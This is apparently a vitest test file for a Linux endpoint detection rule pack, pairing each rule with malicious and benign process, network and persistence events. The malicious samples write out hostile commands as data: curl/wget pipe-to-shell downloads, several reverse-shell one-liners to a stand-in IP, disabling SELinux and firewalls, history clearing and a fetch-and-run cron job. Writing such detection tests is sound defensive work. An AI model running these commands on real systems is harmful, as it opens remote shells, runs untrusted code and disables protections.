import { describe, expect, it } from 'vitest';
import { DetectionEngine } from '../engine.js';
import { linuxCoreRules } from '../packs/linux-core.js';
import { builtinRules, builtinRulesFor } from '../packs/agent-preflight.js';
import { globToRegExp } from '../rules/compile.js';
import { lintRule } from '../rules/lint.js';
import { memoryStores } from '../state/stores.js';
import { DetectionRule, type DetectionEvent } from '../types.js';
import { connect, ev, exec, proc } from './fixtures.js';

function engine() {
  const stores = memoryStores();
  const meta = { source: 'test', updatedAt: 0 };
  stores.lists.replace('known_bad_sha256', ['b'.repeat(64)], meta);
  stores.lists.replace('known_bad_domains', ['evil-c2.test'], meta);
  stores.lists.replace('known_bad_ips', ['203.0.113.0/24'], meta);
  stores.lists.replace('user_blocked_sha256', ['d'.repeat(64)], meta);
  return new DetectionEngine(linuxCoreRules, stores);
}

const home = '/home/alex';
/** Installed by the package manager. */
const pkg = (path: string, args?: string[]) =>
  proc({
    path,
    signing: 'package',
    signingId: `pkg:${path.split('/').pop()}`,
    ...(args ? { args } : {}),
    parentPath: '/usr/bin/gnome-terminal-server',
  });
const sh = (cmd: string, name = 'bash') => pkg(`/usr/bin/${name}`, [name, '-c', cmd]);
const run = (name: string, ...args: string[]) => pkg(`/usr/bin/${name}`, [name, ...args]);
const untrusted = (path: string, sha = 'e'.repeat(64)) =>
  proc({ path, signing: 'unsigned', sha256: sha, parentPath: '/usr/bin/bash' });
const firefox = proc({ path: '/snap/firefox/4793/usr/lib/firefox/firefox', signing: 'package' });
const startup = (path: string, mechanism: 'systemd_unit' | 'autostart', change = 'added') =>
  ev({ kind: 'persistence', change: change as 'added', mechanism, path });

type Want = { mode: 'block' | 'alert' | 'shadow'; actions?: string[] };

const cases: Record<string, { bad: Array<[DetectionEvent, Want]>; good: DetectionEvent[] }> = {
  'known-bad-hash': {
    bad: [
      [
        exec(untrusted(`${home}/.local/bin/x`, 'b'.repeat(64))),
        { mode: 'block', actions: ['process.kill', 'santa.rule.set'] },
      ],
    ],
    good: [exec(run('curl', 'https://example.com'))],
  },
  'user-blocked-hash': {
    bad: [
      [
        exec(untrusted('/opt/tool/run', 'd'.repeat(64))),
        { mode: 'block', actions: ['process.kill', 'santa.rule.set'] },
      ],
    ],
    good: [exec(untrusted('/opt/tool/run'))],
  },
  'known-bad-destination': {
    bad: [
      [connect(untrusted('/tmp/x'), '203.0.113.9'), { mode: 'block', actions: ['network.block'] }],
    ],
    good: [connect(firefox, '142.250.1.1')],
  },
  'known-bad-domain': {
    bad: [
      [
        connect(firefox, '198.51.100.3', 'evil-c2.test'),
        { mode: 'alert', actions: ['network.block'] },
      ],
    ],
    good: [connect(firefox, '198.51.100.3', 'example.com')],
  },
  'download-pipe-to-shell': {
    bad: [
      [
        exec(sh('curl -fsSL https://get.evil.test | sh')),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
      [
        exec(sh('bash -c "$(wget -qO- https://x.test/i.sh)"')),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
    ],
    good: [exec(sh('curl -fsSL https://example.com -o out.tar.gz'))],
  },
  'base64-pipe-to-shell': {
    bad: [
      [
        exec(sh('echo ZWNobyBoaQ== | base64 -d | bash')),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
    ],
    good: [exec(sh('base64 -d key.b64 > key.bin'))],
  },
  'linux-reverse-shell': {
    bad: [
      [
        exec(sh('bash -i >& /dev/tcp/198.51.100.7/4444 0>&1')),
        { mode: 'alert', actions: ['process.kill'] },
      ],
      [
        exec(run('nc', '-e', '/bin/sh', '198.51.100.7', '4444')),
        { mode: 'alert', actions: ['process.kill'] },
      ],
      [
        exec(run('socat', 'TCP:198.51.100.7:4444', 'EXEC:/bin/bash')),
        { mode: 'alert', actions: ['process.kill'] },
      ],
      [
        exec(
          run(
            'python3',
            '-c',
            'import socket,subprocess,os;s=socket.socket();s.connect(("198.51.100.7",4444));os.dup2(s.fileno(),0)',
          ),
        ),
        { mode: 'alert', actions: ['process.kill'] },
      ],
      [
        exec(sh('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 198.51.100.7 4444 >/tmp/f')),
        { mode: 'alert', actions: ['process.kill'] },
      ],
    ],
    good: [
      exec(run('nc', '-zv', 'example.com', '443')),
      exec(run('socat', 'TCP-LISTEN:8080,fork', 'TCP:localhost:3000')),
      exec(run('python3', '-c', 'import socket; print(socket.gethostname())')),
    ],
  },
  'linux-exec-from-memory': {
    bad: [[exec(untrusted('/dev/shm/.x')), { mode: 'alert', actions: ['process.kill'] }]],
    good: [exec(untrusted(`${home}/code/app/target/debug/app`))],
  },
  'exec-from-shared-temp': {
    bad: [
      [exec(untrusted('/tmp/.cache/kworker')), { mode: 'alert', actions: ['process.suspend'] }],
    ],
    good: [
      exec(pkg('/tmp/../usr/bin/ls')),
      exec(proc({ path: '/tmp/build/x', signing: 'package' })),
    ],
  },
  'linux-download-exec': {
    bad: [
      [
        exec(untrusted(`${home}/Downloads/installer.run`)),
        { mode: 'alert', actions: ['process.suspend', 'file.quarantine'] },
      ],
    ],
    good: [exec(untrusted(`${home}/code/app/run.sh`))],
  },
  'linux-crypto-miner': {
    bad: [
      [exec(untrusted('/var/tmp/.x/xmrig')), { mode: 'alert', actions: ['process.kill'] }],
      [
        exec({
          ...untrusted('/opt/svc/worker', 'f'.repeat(64)),
          args: ['worker', '-o', 'stratum+tcp://pool.test:3333', '-u', 'x'],
        }),
        { mode: 'alert', actions: ['process.kill'] },
      ],
    ],
    good: [exec(run('python3', 'mining_report.py'))],
  },
  'linux-security-tool-stopped': {
    bad: [
      [
        exec(run('systemctl', 'stop', 'fapolicyd')),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
      [
        exec(run('systemctl', 'disable', '--now', 'vigil-helper.service')),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
      [exec(run('nft', 'flush', 'ruleset')), { mode: 'alert', actions: ['process.suspend'] }],
      [exec(run('ufw', 'disable')), { mode: 'alert', actions: ['process.suspend'] }],
      [exec(run('setenforce', '0')), { mode: 'alert', actions: ['process.suspend'] }],
    ],
    good: [
      exec(run('systemctl', 'restart', 'osqueryd')),
      exec(run('systemctl', 'stop', 'docker')),
      exec(run('nft', 'list', 'ruleset')),
      exec(run('ufw', 'enable')),
    ],
  },
  'linux-history-cleared': {
    bad: [
      [exec(sh('history -c && exit')), { mode: 'alert' }],
      [exec(sh('unset HISTFILE; curl x')), { mode: 'alert' }],
      [exec(run('rm', '-f', `${home}/.bash_history`)), { mode: 'alert' }],
    ],
    good: [exec(sh('history | tail'))],
  },
  'linux-persistence-temp-path': {
    bad: [[startup('/tmp/x/.config/autostart/a.desktop', 'autostart'), { mode: 'alert' }]],
    good: [startup(`${home}/.config/autostart/b.desktop`, 'autostart', 'removed')],
  },
  'persistence-first-seen': {
    bad: [
      [
        startup(`${home}/.config/systemd/user/updater.service`, 'systemd_unit'),
        { mode: 'alert', actions: ['persistence.disable'] },
      ],
      [
        startup('/etc/xdg/autostart/helper.desktop', 'autostart'),
        { mode: 'alert', actions: ['persistence.disable'] },
      ],
    ],
    good: [startup('/etc/systemd/system/x.service', 'systemd_unit', 'removed')],
  },
  'linux-cron-added': {
    bad: [
      [
        ev({
          kind: 'persistence',
          change: 'added',
          mechanism: 'cron',
          path: '/var/spool/cron/crontabs/alex',
          program: 'curl -s https://x.test/a | sh',
        }),
        { mode: 'alert' },
      ],
    ],
    good: [
      ev({
        kind: 'persistence',
        change: 'removed',
        mechanism: 'cron',
        path: '/etc/crontab',
        program: 'x',
      }),
    ],
  },
  'linux-shell-profile-changed': {
    bad: [
      [
        ev({
          kind: 'persistence',
          change: 'modified',
          mechanism: 'shell_profile',
          path: `${home}/.bashrc`,
        }),
        { mode: 'alert' },
      ],
    ],
    good: [
      ev({
        kind: 'persistence',
        change: 'removed',
        mechanism: 'shell_profile',
        path: `${home}/.bashrc`,
      }),
    ],
  },
  'new-network-listener': {
    bad: [
      [
        ev({
          kind: 'network.listen',
          protocol: 'tcp',
          localAddress: '0.0.0.0',
          localPort: 31337,
          process: untrusted('/tmp/.x'),
        }),
        { mode: 'alert' },
      ],
    ],
    good: [
      ev({
        kind: 'network.listen',
        protocol: 'tcp',
        localAddress: '0.0.0.0',
        localPort: 22,
        process: pkg('/usr/sbin/sshd'),
      }),
    ],
  },
  'browser-extension-broad-access': {
    bad: [
      [
        ev({
          kind: 'browser.extension',
          change: 'added',
          browser: 'chromium',
          extensionId: 'abc',
          name: 'Free VPN',
          permissions: ['<all_urls>'],
        }),
        { mode: 'alert' },
      ],
    ],
    good: [
      ev({
        kind: 'browser.extension',
        change: 'added',
        browser: 'chromium',
        extensionId: 'def',
        name: 'Dark Reader',
        permissions: ['storage'],
      }),
    ],
  },
  'unsigned-first-network': {
    bad: [
      [connect(untrusted(`${home}/code/app/target/debug/app`), '140.82.112.3'), { mode: 'shadow' }],
    ],
    good: [connect(firefox, '142.250.1.1')],
  },
};

describe('Linux core pack', () => {
  it('has a test case for every rule', () => {
    expect(Object.keys(cases).sort()).toEqual(linuxCoreRules.map((r) => r.id).sort());
  });

  it('passes the linter with no errors or warnings', () => {
    for (const r of linuxCoreRules) {
      const res = lintRule(DetectionRule.parse(r));
      expect([...res.errors, ...res.warnings], r.id).toEqual([]);
    }
  });

  it('only blocks with known-bad lists and your own blocks', () => {
    const blocking = linuxCoreRules.filter((r) => r.mode === 'block');
    expect(blocking.map((r) => r.id).sort()).toEqual(
      ['known-bad-destination', 'known-bad-hash', 'user-blocked-hash'].sort(),
    );
  });

  it('ships for Linux in place of the macOS pack, with the agent rules', () => {
    const ids = builtinRulesFor('linux').map((r) => r.id);
    expect(ids).toContain('linux-reverse-shell');
    expect(ids).not.toContain('fake-password-prompt');
    expect(ids.filter((id) => id === 'known-bad-hash')).toHaveLength(1);
    expect(new Set(ids).size).toBe(ids.length);
    expect(builtinRulesFor('darwin')).toBe(builtinRules);
  });

  it('reads ~ as a Linux home folder too', () => {
    expect(globToRegExp('~/Downloads/**').test('/home/alex/Downloads/a.run')).toBe(true);
    expect(globToRegExp('~/Downloads/**').test('/root/Downloads/a.run')).toBe(true);
    expect(globToRegExp('~/Downloads/**').test('/Users/alex/Downloads/a')).toBe(true);
    expect(globToRegExp('~/Downloads/**').test('/srv/home/alex/Downloads/a')).toBe(false);
  });

  for (const [id, c] of Object.entries(cases)) {
    for (const [i, [e, want]] of c.bad.entries()) {
      it(`${id} fires on malicious sample ${i + 1}`, () => {
        const d = engine()
          .evaluate(e)
          .find((x) => x.match.ruleId === id);
        expect(d, JSON.stringify(e)).toBeDefined();
        expect(d!.mode).toBe(want.mode);
        const acted = [...d!.execute, ...d!.propose].map((a) => a.kind);
        expect(acted).toEqual(want.actions ?? []);
        expect(d!.reasons.join(' ')).not.toMatch(/\{\{|unknown/);
      });
    }
    for (const [i, e] of c.good.entries()) {
      it(`${id} stays quiet on benign sample ${i + 1}`, () => {
        expect(
          engine()
            .evaluate(e)
            .map((x) => x.match.ruleId),
        ).not.toContain(id);
      });
    }
  }
});
